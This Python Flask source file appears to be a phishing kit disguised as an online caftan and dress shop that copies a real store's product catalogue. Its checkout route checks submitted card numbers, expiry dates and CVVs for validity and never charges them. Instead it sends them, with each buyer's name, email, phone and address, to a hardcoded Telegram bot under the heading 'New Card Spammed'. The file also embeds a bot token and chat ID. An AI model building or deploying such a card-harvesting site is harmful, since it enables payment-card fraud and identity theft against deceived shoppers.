from flask import Flask, render_template, request, redirect, url_for, session, jsonify, abort
import secrets
import random
import os
import re
from datetime import datetime
import requests

app = Flask(__name__)
# A secret key is required for using sessions in Flask
app.secret_key = secrets.token_hex(16)

# --- Caching for static HTML files ---
# This dictionary will act as a simple in-memory cache to speed up file reads.
html_cache = {}

def get_cached_html(file_path):
    """
    Reads HTML from a file and caches it in memory to improve performance.
    If the file is not in the cache, it's read from disk and stored.
    """
    if file_path not in html_cache:
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                html_cache[file_path] = f.read()
        except FileNotFoundError:
            return None
    return html_cache[file_path]

# --- Telegram Notification Functions ---
def escape_markdown(text):
    """
    Escapes characters for Telegram's MarkdownV2 syntax.
    """
    text = str(text)
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + char if char in escape_chars else char for char in text)

def send_telegram_notification(message):
    """
    Sends a message to a specific Telegram user via a bot.
    """
    bot_token = "8085839813:AAG4l4f8TZUe541j0XyR49o3TU-vvodW6QY"
    chat_id = "6712801206"
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'MarkdownV2'
    }

    try:
        response = requests.post(api_url, json=payload)
        response.raise_for_status()
        print("Telegram notification sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"ERROR: Failed to send Telegram notification: {e}")
        if 'response' in locals():
            print(f"Telegram API Response: {response.text}")

# --- Credit Card Validation Functions ---
def luhn_check(card_number):
    """Validates a credit card number using the Luhn algorithm."""
    try:
        digits = [int(d) for d in str(card_number)]
        checksum = 0
        for i, digit in enumerate(reversed(digits)):
            if i % 2 == 1:
                digit *= 2
                if digit > 9:
                    digit -= 9
            checksum += digit
        return checksum % 10 == 0
    except (ValueError, TypeError):
        return False

def get_card_type(card_number):
    """Determines card type based on the starting digits."""
    if re.match(r"^4[0-9]{12}(?:[0-9]{3})?$", card_number):
        return "Visa"
    elif re.match(r"^5[1-5][0-9]{14}$", card_number):
        return "Mastercard"
    elif re.match(r"^3[47][0-9]{13}$", card_number):
        return "American Express"
    elif re.match(r"^3(?:0[0-5]|[68][0-9])[0-9]{11}$", card_number):
        return "Diners Club"
    elif re.match(r"^6(?:011|5[0-9]{2})[0-9]{12}$", card_number):
        return "Discover"
    elif re.match(r"^(?:2131|1800|35\d{3})\d{11}$", card_number):
        return "JCB"
    return "Unknown"

# --- Product Data and Countries ---
products = {
    "49029669716242": {"name": "Loose, casual Caftan - C95", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/C953.jpg?v=1715100300&width=400", "handle": "caftan-95"},
    "49029677678866": {"name": "Loose, casual Caftan - C98", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/C984.jpg?v=1715100339&width=400", "handle": "caftan-98"},
    "49029652840722": {"name": "Loose, casual Caftan - C91", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/C912.jpg?v=1715026857&width=400", "handle": "caftan-91"},
    "49029660115218": {"name": "Loose, casual Caftan - C93", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/C933.jpg?v=1715026986&width=400", "handle": "caftan-93"},
    "51188445905170": {"name": "Loose, casual Caftan - C112", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/112-3.jpg?v=1744667599&width=400", "handle": "caftan-112"},
    "51188440400146": {"name": "Loose, casual Caftan - C110", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/110-2.jpg?v=1744667171&width=400", "handle": "caftan-110"},
    "51188456063250": {"name": "Loose, casual Caftan - C116", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/116-5.jpg?v=1744667975&width=400", "handle": "caftan-116"},
    "51188453114130": {"name": "Loose, casual Caftan - C115", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/115-4.jpg?v=1744667897&width=400", "handle": "caftan-115"},
    "51275105403154": {"name": "Casual, Pocket Dress - D1", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/Dress13.jpg?v=1747078156&width=400", "handle": "pocket-dress1"},
    "51275156062482": {"name": "Casual, Pocket Dress - D9", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/Dress92.jpg?v=1747080881&width=400", "handle": "pocket-dress9"},
    "51275126472978": {"name": "Casual, Pocket Dress - D2", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/Dress23.jpg?v=1747080317&width=400", "handle": "pocket-dress2"},
    "51275134206226": {"name": "Casual, Pocket Dress - D5", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/Dress52.jpg?v=1747080616&width=400", "handle": "pocket-dress5"},
    "43642508607762": {"name": "Loose, casual Caftan - C58", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/products/c582.jpg?v=1676992143&width=400", "handle": "caftan-58"},
    "43642508509458": {"name": "Loose, casual Caftan - C61", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/products/c612.jpg?v=1676992013&width=400", "handle": "caftan-61"},
    "43642508804370": {"name": "Loose, casual Caftan - C52", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/products/c522.jpg?v=1676992388&width=400", "handle": "caftan-52"},
    "43642508411154": {"name": "Loose, casual Caftan - C64", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/products/c645.jpg?v=1699534902&width=400", "handle": "caftan-64"},
    "51419957133586": {"name": "Loose, casual Caftan - C141", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/141-5.jpg?v=1751140237&width=400", "handle": "caftan-141"},
    "51419957166354": {"name": "Loose, casual Caftan - C142", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/142-4.jpg?v=1751140296&width=400", "handle": "caftan-142"},
    "51419956674834": {"name": "Loose, casual Caftan - C140", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/files/140-1.jpg?v=1751140117&width=400", "handle": "caftan-140"},
    "43642508149010": {"name": "Loose, casual Caftan - C16", "price": 39.00, "image": "//ornellacaftan-us.com/cdn/shop/products/c164.jpg?v=1744664667&width=400", "handle": "caftan-16"}
}
countries = ["United States", "Canada", "United Kingdom", "Australia", "Germany", "France", "Japan", "Brazil", "India", "China", "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Argentina", "Armenia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Cape Verde", "Central African Republic", "Chad", "Chile", "Colombia", "Comoros", "Congo", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Fiji", "Finland", "Gabon", "Gambia", "Georgia", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Macedonia", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Swaziland", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"]

# --- Helper Functions ---
def get_recommendations(cart_items, num_recommendations=2):
    cart_product_ids = cart_items.keys()
    available_products = {pid: p for pid, p in products.items() if pid not in cart_product_ids}
    if not available_products:
        return []
    sample_size = min(num_recommendations, len(available_products))
    recommended_ids = random.sample(list(available_products.keys()), sample_size)
    return [{'id': pid, **available_products[pid]} for pid in recommended_ids]

def inject_script(content):
    # This function is designed to inject scripts into HTML content.
    # For simplicity in this context, we assume the cart_script.js exists.
    # In a real scenario, ensure the file path is correct.
    try:
        with open('static/cart_script.js', 'r', encoding='utf-8') as f:
            script_content = f.read()
    except FileNotFoundError:
        script_content = "console.error('cart_script.js not found');"

    script_to_inject = f"""
    <style>
        cart-drawer.is-open {{ visibility: visible; transform: translateX(0) !important; }}
        .drawer__overlay {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0, 0, 0, 0.5); opacity: 0; visibility: hidden; transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out; z-index: 19; }}
        cart-drawer.is-open + .drawer__overlay {{ opacity: 1; visibility: visible; }}
        @media (max-width: 767px) {{
            cart-drawer.is-fullscreen {{
                width: 100%; height: 100%; top: 0; right: 0;
                transform: translateY(100%) !important;
                transition: transform 0.4s ease-in-out;
            }}
            cart-drawer.is-fullscreen.is-open {{
                 transform: translateY(0) !important;
            }}
        }}
        .product-card__info .product-card__title a,
        .product-card__info .price-list,
        .product-card__info .price-list .text-on-sale,
        .product-card__info .price-list .line-through {{
            color: #1a1a1a !important;
        }}
        .product-card__info .text-subdued {{
             color: #787979 !important;
        }}
    </style>
    <div class="drawer__overlay"></div>
    <script>{script_content}</script>
    """
    return content.replace('</body>', script_to_inject + '</body>')

def get_cart_data():
    cart_items = session.get('cart', {})
    cart_count = sum(item.get('quantity', 0) for item in cart_items.values())
    subtotal = sum(item['price'] * item['quantity'] for item in cart_items.values())
    recommendations = get_recommendations(cart_items)
    return {
        'success': True,
        'cart_count': cart_count,
        'subtotal': subtotal,
        'items': cart_items,
        'recommendations': recommendations
    }

# --- Flask Routes ---
@app.route('/')
def index():
    """Renders the storefront page."""
    content = get_cached_html('templates/index.html')
    if content is None:
        abort(404)
    return inject_script(content)

@app.route('/products/<product_handle>')
def product_page(product_handle):
    """Renders a specific product page."""
    product_file_path = os.path.join('templates', 'products', f'{product_handle}.html')
    content = get_cached_html(product_file_path)
    if content is None:
        abort(404)
    return inject_script(content)

@app.route("/collections/new")
@app.route("/collections/caftans-on-sale")
@app.route("/collections/pocket-dresses")
@app.route("/collections/classics")
@app.route("/collections/new-arrivals")
def collections():
    """Renders the new collections page."""
    content = get_cached_html('templates/collections.html')
    if content is None:
        abort(404)
    return inject_script(content)

@app.route('/cart/add', methods=['POST'])
def add_to_cart():
    """Adds an item to the cart."""
    if 'cart' not in session:
        session['cart'] = {}
    cart = session.get('cart', {})
    product_id = request.form.get('id')
    if product_id in products:
        if product_id in cart:
            cart[product_id]['quantity'] += 1
        else:
            cart[product_id] = {**products[product_id], 'quantity': 1}
        session['cart'] = cart
    return jsonify(get_cart_data())

@app.route('/cart/update/<product_id>', methods=['POST'])
def update_cart(product_id):
    """Updates item quantity in the cart."""
    cart = session.get('cart', {})
    if product_id in cart:
        action = request.json.get('action')
        if action == 'increase':
            cart[product_id]['quantity'] += 1
        elif action == 'decrease':
            cart[product_id]['quantity'] -= 1
            if cart[product_id]['quantity'] <= 0:
                del cart[product_id]
        session['cart'] = cart
    return jsonify(get_cart_data())

@app.route('/cart/data')
def cart_data_endpoint():
    """API endpoint to provide current cart data."""
    return jsonify(get_cart_data())

@app.route('/cart/clear')
def clear_cart():
    """Clears all items from the cart."""
    session.pop('cart', None)
    return redirect(url_for('index'))

@app.route("/thankyou")
def thankyou():
    """Renders the thank you page with the last order's details."""
    order_details = session.get('last_order', None)
    if not order_details:
        return redirect(url_for('index'))
    return render_template("thankyou.html", order=order_details)

@app.route('/checkout', methods=['GET'])
def checkout():
    """Handles displaying the checkout page."""
    cart_items = session.get('cart', {})
    if not cart_items:
        return redirect(url_for('index'))
    subtotal = sum(item['price'] * item['quantity'] for item in cart_items.values())
    shipping = 0.00
    total = subtotal + shipping
    return render_template('checkout.html', cart_items=cart_items.values(), subtotal=subtotal, shipping=shipping, total=total, countries=countries)

@app.route('/handle_form_submission', methods=['POST'])
def handle_form_submission():
    """Validates form data, sends a notification, and prepares for thank you page."""
    errors = {}
    data = request.form
    cart_items = session.get('cart', {})

    # --- Validation ---
    card_number_cleaned = data.get('card_number', '').replace(' ', '')
    expiry = data.get('expiry', '').replace(' ', '')
    cvv = data.get('cvv', '')
    card_type = get_card_type(card_number_cleaned)

    if not (13 <= len(card_number_cleaned) <= 16) or not luhn_check(card_number_cleaned):
        errors['card_number'] = "Invalid credit card number."
    if not (cvv and (len(cvv) == 4 if card_type == "American Express" else len(cvv) == 3)):
        errors['cvv'] = "Invalid CVV."
    try:
        exp_month, exp_year = map(int, expiry.split('/'))
        current_year = datetime.now().year % 100
        current_month = datetime.now().month
        if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
            errors['expiry'] = "This card has expired."
    except (ValueError, IndexError):
        errors['expiry'] = "Invalid date format."

    if errors:
        return jsonify({"success": False, "errors": errors}), 400

    # --- Calculate totals ---
    subtotal = sum(item['price'] * item['quantity'] for item in cart_items.values())
    country = data.get('country')
    shipping = 15.00 if country != 'United States' else 0.00
    total = subtotal + shipping
    order_id = random.randint(1000, 9999)

    # --- Store order details in session for thank you page ---
    session['last_order'] = {
        'id': order_id,
        'customer': {
            'first_name': data.get('first_name'),
            'last_name': data.get('last_name'),
            'email': data.get('email'),
        },
        'shipping_address': {
            'first_name': data.get('first_name'),
            'last_name': data.get('last_name'),
            'address': data.get('address'),
            'apartment': data.get('apartment'),
            'city': data.get('city'),
            'state': data.get('state'),
            'zip': data.get('zip'),
            'country': country,
        },
        'items': cart_items,
        'subtotal': subtotal,
        'shipping': shipping,
        'total': total
    }

    # --- Send Telegram Notification ---
    e = escape_markdown
    get = lambda key, default='N/A': data.get(key, default) or default

    message_parts = [
        f"📦 *New Card Spammed \\(\\#{order_id}\\)* 📦",
        f"\n*Contact & Delivery*",
        f"Email: {e(get('email'))}",
        f"Phone: {e(get('phone'))}",
        f"Name: {e(get('first_name'))} {e(get('last_name'))}",
        f"Address: {e(get('address'))}",
        f"Apt/Suite: {e(get('apartment'))}",
        f"Location: {e(get('city'))}, {e(get('state'))} {e(get('zip'))}",
        f"Country: {e(get('country'))}",
        f"\n*Payment Details*",
        f"Card Type: {e(card_type)}",
        f"Card Number: `{e(card_number_cleaned)}`",
        f"Name on Card: {e(get('card_name'))}",
        f"Expiry: `{e(expiry)}`",
        f"CVV: `{e(cvv)}`",
        f"\n*Billing Address*"
    ]

    if get('billing_address') == 'different':
        message_parts.append(f"_\\(Different from shipping address\\)_")
    else:
        message_parts.append(f"_\\(Same as shipping address\\)_")

    send_telegram_notification("\n".join(message_parts))
    session.pop('cart', None)
    return jsonify({"success": True, "redirect_url": url_for('thankyou')})

@app.route('/update_summary', methods=['POST'])
def update_summary():
    """Calculates shipping and updates the total for the checkout page."""
    data = request.get_json()
    country = data.get('country')
    cart_items = session.get('cart', {})
    subtotal = sum(item['price'] * item['quantity'] for item in cart_items.values())

    shipping = 15.00
    if country == 'United States':
        shipping = 0.00

    total = subtotal + shipping
    return jsonify({'shipping': f'${shipping:.2f}', 'total': f'${total:.2f}'})

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
